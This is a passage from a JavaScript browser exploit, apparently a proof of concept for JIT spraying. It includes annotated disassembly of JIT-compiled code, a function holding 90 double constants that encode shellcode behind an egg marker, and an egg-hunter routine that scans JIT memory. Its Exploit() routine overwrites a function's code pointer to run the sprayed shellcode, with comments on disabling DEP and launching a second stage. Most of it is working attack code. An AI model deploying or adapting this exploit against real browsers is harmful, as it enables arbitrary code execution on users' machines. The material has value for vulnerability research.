00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141                 <- Note the first double float being loaded into RBX        
00000087EB6F5341 | 53                       | push rbx                             
00000087EB6F5342 | 49:BB D810EAFCF1000000   | mov r11,F1FCEA10D8                   
00000087EB6F534C | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F534F | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5351 | 48:83C4 08               | add rsp,8                            
00000087EB6F5355 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F535F | 49:BB E810EAFCF1000000   | mov r11,F1FCEA10E8                   
00000087EB6F5369 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F536C | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F536E | 48:BB 9090554889E54883   | mov rbx,8348E58948559090             
00000087EB6F5378 | 53                       | push rbx                             
00000087EB6F5379 | 49:BB F810EAFCF1000000   | mov r11,F1FCEA10F8              
00000087EB6F5383 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F5386 | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5388 | 48:83C4 08               | add rsp,8                            
00000087EB6F538C | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F5396 | 49:BB 0811EAFCF1000000   | mov r11,F1FCEA1108              
00000087EB6F53A0 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F53A3 | FF17                     | call qword ptr ds:[rdi]                              
...

Rather than implanting the double float constants into the JIT'd code region as
an array of raw constant data, the JIT engine has created a (very large) quantity
of code which manually handles each individual double float one by one (this code
goes on much further than I have pasted here). You can see this at:

00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141  

This is the first double float 5.40900888e-315 (the stage one shellcode egg)
being loaded into RBX, where each subsequent double is treated the same.

In contrast, any JIT sprayed function with less than 100 double floats yields
a substantially different region of code at its JIT code pointer:

000002C6944D4470 | 48:8B4424 20             | mov rax,qword ptr ss:[rsp+20]    <- JIT code pointer for JIT sprayed function points here
000002C6944D4475 | 48:C1E8 2F               | shr rax,2F                              
000002C6944D4479 | 3D F3FF0100              | cmp eax,1FFF3                           
000002C6944D447E | 0F85 A4060000            | jne 2C6944D4B28                         
...
000002C6944D4ACB | F2:0F1180 C00A0000       | movsd qword ptr ds:[rax+AC0],xmm0       
000002C6944D4AD3 | F2:0F1005 6D030000       | movsd xmm0,qword ptr ds:[2C6944D4E48]   
000002C6944D4ADB | F2:0F1180 C80A0000       | movsd qword ptr ds:[rax+AC8],xmm0       
000002C6944D4AE3 | F2:0F1005 65030000       | movsd xmm0,qword ptr ds:[2C6944D4E50]   
000002C6944D4AEB | F2:0F1180 D00A0000       | movsd qword ptr ds:[rax+AD0],xmm0       
000002C6944D4AF3 | F2:0F1005 5D030000       | movsd xmm0,qword ptr ds:[2C6944D4E58]   
000002C6944D4AFB | F2:0F1180 D80A0000       | movsd qword ptr ds:[rax+AD8],xmm0       
000002C6944D4B03 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                
000002C6944D4B0D | C3                       | ret                                     
000002C6944D4B0E | 90                       | nop                                     
000002C6944D4B0F | 90                       | nop                                     
000002C6944D4B10 | 90                       | nop                                     
000002C6944D4B11 | 90                       | nop                                     
000002C6944D4B12 | 90                       | nop                                     
000002C6944D4B13 | 90                       | nop                                     
000002C6944D4B14 | 90                       | nop                                     
000002C6944D4B15 | 90                       | nop                                     
000002C6944D4B16 | 49:BB 30B14E5825000000   | mov r11,25584EB130                      
000002C6944D4B20 | 41:53                    | push r11                                
000002C6944D4B22 | E8 C9C6FBFF              | call 2C6944911F0                        
000002C6944D4B27 | CC                       | int3                                    
000002C6944D4B28 | 6A 00                    | push 0                                  
000002C6944D4B2A | E9 11000000              | jmp 2C6944D4B40                         
000002C6944D4B2F | 50                       | push rax                                
000002C6944D4B30 | 68 20080000              | push 820                                
000002C6944D4B35 | E8 5603FCFF              | call 2C694494E90                        
000002C6944D4B3A | 58                       | pop rax                                 
000002C6944D4B3B | E9 85F9FFFF              | jmp 2C6944D44C5                         
000002C6944D4B40 | 6A 00                    | push 0                                  
000002C6944D4B42 | E9 D9C5FBFF              | jmp 2C694491120                         
000002C6944D4B47 | F4                       | hlt                                     
000002C6944D4B48 | 41414141:0000            | add byte ptr ds:[r8],al          <- JIT sprayed egg double
000002C6944D4B4E | 0000                     | add byte ptr ds:[rax],al                
000002C6944D4B50 | 90                       | nop                              <- JIT sprayed shellcode begins here
000002C6944D4B51 | 90                       | nop                                     
000002C6944D4B52 | 55                       | push rbp                                
000002C6944D4B53 | 48:89E5                  | mov rbp,rsp                             
000002C6944D4B56 | 48:83EC 40               | sub rsp,40                              
000002C6944D4B5A | 48:83EC 08               | sub rsp,8                               
000002C6944D4B5E | 40:80E4 F7               | and spl,F7                              
000002C6944D4B62 | 48:B8 1122334455667788   | mov rax,8877665544332211                
000002C6944D4B6C | 48:8945 C8               | mov qword ptr ss:[rbp-38],rax           
000002C6944D4B70 | 48:C7C1 884E0D00         | mov rcx,D4E88                           
000002C6944D4B77 | E8 F9000000              | call 2C6944D4C75                        

This then introduces another constaint on JIT spraying beyoond forcing your
assembly bytecode to be 100% valid double floats. You are also limited to a
maximum of 100 doubles (800 bytes) including your egg prefix.
*/

function JITSprayFunc(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    X1 = 58394.27801956298;
    X2 = -3.384548150597339e+269;
    X3 = -9.154525457562153e+192;
    X4 = 4.1005939302288804e+42;
    X5 = -5.954550387086224e-264;
    X6 = -6.202600667005017e-264;
    X7 = 3.739444822644755e+67;
    X8 = -1.2650161464211396e+258;
    X9 = -2.6951286493033994e+35;
    X10 = 1.3116505146398627e+104;
    X11 = -1.311379727091241e+181;
    X12 = 1.1053351980286266e-265;
    X13 = 7.66487078033362e+42;
    X14 = 1.6679557218696946e-235;
    X15 = 1.1327634929857868e+27;
    X16 = 6.514949632148056e-152;
    X17 = 3.75559130646382e+255;
    X18 = 8.6919639111614e-311;
    X19 = -1.0771492276655187e-142;
    X20 = 1.0596460749348558e+39;
    X21 = 4.4990090566228275e-228;
    X22 = 2.6641556100123696e+41;
    X23 = -3.695293685173417e+49;
    X24 = 7.675324624976707e-297;
    X25 = 5.738262935249441e+40;
    X26 = 4.460149175031513e+43;
    X27 = 8.958658002980807e-287;
    X28 = -1.312880373645135e+35;
    X29 = 4.864674571015197e+42;
    X30 = -2.500435320470142e+35;
    X31 = -2.800945285957394e+277;
    X32 = 1.44103957698964e+28;
    X33 = 3.8566513062216665e+65;
    X34 = 1.37405680231e-312;
    X35 = 1.6258034990195507e-191;
    X36 = 1.5008582713363865e+43;
    X37 = 3.1154847750709123;
    X38 = -6.809578792021008e+214;
    X39 = -7.696699288147737e+115;
    X40 = 3.909631192677548e+112;
    X41 = 1.5636948002514616e+158;
    X42 = -2.6295656969507476e-254;
    X43 = -6.001472476578534e-264;
    X44 = 9.25337251529007e-33;
    X45 = 4.419915842157561e-80;
    X46 = 8.07076629722016e+254;
    X47 = 3.736523284e-314;
    X48 = 3.742120352320771e+254;
    X49 = 1.0785207713761078e-32;
    X50 = -2.6374368557341455e-254;
    X51 = 1.2702053652464168e+145;
    X52 = -1.3113796337500435e+181;
    X53 = 1.2024564583763433e+111;
    X54 = 1.1326406542153807e+104;
    X55 = 9.646933740426927e+39;
    X56 = -2.5677414592270957e-254;
    X57 = 1.5864445474697441e+233;
    X58 = -2.6689139052065564e-251;
    X59 = 1.0555057376604044e+27;
    X60 = 8.364524068863995e+42;
    X61 = 3.382975178824556e+43;
    X62 = -8.511722322449098e+115;
    X63 = -2.2763239573787572e+271;
    X64 = -6.163839243926498e-264;
    X65 = 1.5186209005088964e+258;
    X66 = 7.253360348539147e-192;
    X67 = -1.2560830051206045e+234;
    X68 = 1.102849544e-314;
    X69 = -2.276324008154652e+271;
    X70 = 2.8122150524016884e-71;
    X71 = 5.53602304257365e-310;
    X72 = -6.028598990540894e-264;
    X73 = 1.0553922879130128e+27;
    X74 = -1.098771600725952e-244;
    X75 = -2.5574368247075522e-254;
    X76 = 3.618778572061404e-171;
    X77 = -1.4656824334476123e+40;
    X78 = 4.6232700581905664e+42;
    X79 = -3.6562604268727894e+125;
    X80 = -2.927408487880894e+78;
    X81 = 1.087942540606703e-309;
    X82 = 6.440226123500225e+264;
    X83 = 3.879424446462186e+148;
    X84 = 3.234472631797124e+40;
    X85 = 1.4186706350383543e-307;
    X86 = 1.2617245769382784e-234;
    X87 = 1.3810793979336581e+43;
    X88 = 1.565026152201332e+43;
    X89 = 5.1402745833993635e+153;
    X90 = 9.63e-322;
}

function EggHunter(TargetAddressDbl) {
    var ScanPtr = TargetAddressDbl;

    for(var i = 0; i < 1000; i++) { // 1000 QWORDs give me the most stable result. The more double float constants are in the JIT'd function, the more handler code seems to precede them.
        HelperDbl[0] = ScanPtr;
        var DblVal = ExplicitLeakDbl(ScanPtr); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            HelperDbl[0] = ScanPtr;
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            return HelperDbl[0];
        }
        
        HelperDbl[0] = ScanPtr;
        HelperDword[0] = HelperDword[0] + 8;
        ScanPtr = HelperDbl[0];
    }
    
    return 0.0;
}

////////
////////
// Primary high level exploit logic
////////

function Exploit() {
    for(var i = 0; i < JITIterations; i++) {
        JITSprayFunc(); // JIT spray the shellcode to a private +RX region of virtual memory
    }

    var JITCodePtr = GetJSFuncJITCodePtr(JITSprayFunc);
    
    if(JITCodePtr) {
        // Setup the strong read primitive for the stage one egg hunter: attempting to interpret assembly byte code as doubles via weak primitive may crash the process (tagged pointer bits could cause the read value to be dereferenced as a pointer)
        
        HelperDbl[0] = JITCodePtr;
        //DebugLog("JIT spray code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        InitStrongRWPrimitive();
		//StrongWriteDword(0, 0x22222222);
        ShellcodeAddress = EggHunter(JITCodePtr); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the JIT sprayed function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
            HelperDbl[0] = ShellcodeAddress;
            //DebugLog("Shellcode pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
            var JITInfoAddress = GetJSFuncJITInfoPtr(JITSprayFunc);
            WeakWriteDbl(JITInfoAddress, ShellcodeAddress);
            JITSprayFunc(); // Notably the location of the data in the stage two shellcode Uint8Array can be found at offset 0x40 from the start of the array object when the array is small, and when it is large (as in the case of the WPAD shellcode) a pointer to it can be found at offset 0x38 from the start of the array object. In this case though, the stage one egg hunter shellcode finds, disables DEP and ADDITIONALLY executes the stage two shellcode itself, so there is no reason to locate/execute it from JS.
        }
        else {
            DebugLog("Failed to resolve shellcode address");
        }
    }
}

Exploit();
